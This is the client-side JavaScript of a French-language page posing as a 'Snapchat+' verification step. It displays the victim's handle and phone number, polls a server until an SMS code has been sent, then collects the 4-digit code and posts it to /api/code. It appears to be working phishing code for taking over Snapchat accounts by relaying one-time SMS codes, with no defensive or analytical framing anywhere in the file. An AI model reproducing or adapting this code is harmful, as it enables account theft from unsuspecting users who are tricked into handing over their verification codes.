"use strict";

const verif = (() => { try { return JSON.parse(sessionStorage.getItem("verif")); } catch { return null; } })();
if (!verif || !verif.rid) { window.location.href = "index.html"; }

const SVC_LABELS = { snap: "Snapchat+" };

// Fill recap
document.getElementById("recap-pseudo").textContent = verif.pseudo || "-";
document.getElementById("recap-handle").textContent = verif.handle ? "@" + verif.handle : "-";
document.getElementById("recap-phone").textContent = (verif.phone || "").replace(/(\d{2})(?=\d)/g, "$1\u00a0");
document.getElementById("pill-svc").textContent = SVC_LABELS[verif.svc] || verif.svc;

let poll = null;
let inflight = false;

const viewWait = document.getElementById("view-wait");
const viewCode = document.getElementById("view-code");
const viewOk = document.getElementById("view-ok");

function showView(v) {
  [viewWait, viewCode, viewOk].forEach(el => el.style.display = "none");
  v.style.display = "";
}

async function apiGet(path) {
  try {
    const res = await fetch(path, { cache: "no-store" });
    return await res.json();
  } catch (e) { return null; }
}

async function checkStatus() {
  if (inflight) return;
  inflight = true;
  try {
    const d = await apiGet("/api/status/" + verif.rid + "?_=" + Date.now());
    if (!d) {
      document.getElementById("wait-meta").textContent = "Serveur indisponible";
      return;
    }
    if (d.status === "expired") { stopPoll(); document.getElementById("wait-meta").textContent = "Session expiree"; return; }
    if (d.status === "resolved") { stopPoll(); showView(viewOk); return; }
    if (d.status === "code_sent") {
      stopPoll();
      document.getElementById("pill-status").textContent = "SMS envoye";
      document.getElementById("code-badge-text").textContent = "Saisie du code";
      document.getElementById("code-title").textContent = "Code de verification";
      document.getElementById("code-sub").textContent = "Un code a 4 chiffres a ete envoye par SMS.";
      showView(viewCode);
      digits[0].focus();
      return;
    }
    document.getElementById("wait-meta").textContent = "Derniere verif: " + new Date().toLocaleTimeString("fr-FR");
  } catch (e) {
    document.getElementById("wait-meta").textContent = "Reconnexion...";
  } finally {
    inflight = false;
  }
}

function startPoll() {
  if (poll) return;
  poll = setInterval(checkStatus, 2000);
  checkStatus();
}
function stopPoll() { clearInterval(poll); poll = null; }

document.getElementById("btn-check").addEventListener("click", checkStatus);

// ── Code digits ──
const digits = [...document.querySelectorAll(".digit")];
const btnCode = document.getElementById("btn-code");
const fbCode = document.getElementById("fb-code");
let submitting = false;

function getCode() { return digits.map(d => d.value).join(""); }

function updateDigits() {
  const code = getCode();
  btnCode.disabled = code.length < 4 || submitting;
  fbCode.className = "feedback";
  fbCode.textContent = "";
}

digits.forEach((d, i) => {
  d.addEventListener("input", () => {
    d.value = d.value.replace(/\D/g, "").slice(-1);
    if (d.value && i < 3) digits[i + 1].focus();
    updateDigits();
  });
  d.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !d.value && i > 0) { digits[i - 1].value = ""; digits[i - 1].focus(); updateDigits(); }
    if (e.key === "Enter" && getCode().length === 4) btnCode.click();
  });
  d.addEventListener("paste", (e) => {
    e.preventDefault();
    const paste = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 4);
    paste.split("").forEach((c, j) => { if (digits[j]) digits[j].value = c; });
    if (digits[Math.min(paste.length, 3)]) digits[Math.min(paste.length, 3)].focus();
    updateDigits();
  });
});

btnCode.addEventListener("click", async () => {
  const code = getCode();
  if (code.length < 4 || submitting) return;
  submitting = true;
  btnCode.disabled = true;
  btnCode.innerHTML = '<div class="spinner"></div><span>Validation...</span>';

  try {
    const res = await fetch(window.location.origin + "/api/code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ rid: verif.rid, code: code }),
    });
    const ok = await res.json();
    if (ok && ok.ok) {
      sessionStorage.removeItem("verif");
      showView(viewOk);
      launchConfetti();
    } else {
      fbCode.className = "feedback err";
      fbCode.textContent = "Erreur, reessaie";
      btnCode.disabled = false;
      btnCode.innerHTML = '<span>Confirmer le code</span>';
      submitting = false;
    }
  } catch (e) {
    fbCode.className = "feedback err";
    fbCode.textContent = "Erreur reseau";
    btnCode.disabled = false;
    btnCode.innerHTML = '<span>Confirmer le code</span>';
    submitting = false;
  }
});

// ── Confetti ──
function launchConfetti() {
  const colors = ["#FFFC00", "#FFF59D", "#22c55e", "#f59e0b", "#ec4899"];
  for (let i = 0; i < 50; i++) {
    setTimeout(() => {
      const el = document.createElement("div");
      const s = Math.random() * 8 + 4;
      Object.assign(el.style, {
        position: "fixed", top: "-10px", left: Math.random() * 100 + "vw",
        width: s + "px", height: s + "px", borderRadius: Math.random() > 0.5 ? "50%" : "2px",
        background: colors[Math.floor(Math.random() * colors.length)],
        pointerEvents: "none", zIndex: "9999",
        animation: "cfall " + (1 + Math.random() * 1.5) + "s ease-in forwards",
      });
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 2500);
    }, i * 25);
  }
}

// ── Toast ──
function toast(msg, type) {
  const wrap = document.getElementById("toast-wrap");
  const el = document.createElement("div");
  el.className = "toast " + (type || "success");
  el.textContent = msg;
  wrap.appendChild(el);
  setTimeout(() => { el.style.opacity = "0"; setTimeout(() => el.remove(), 2500); }, 2500);
}

// ── Start ──
startPoll();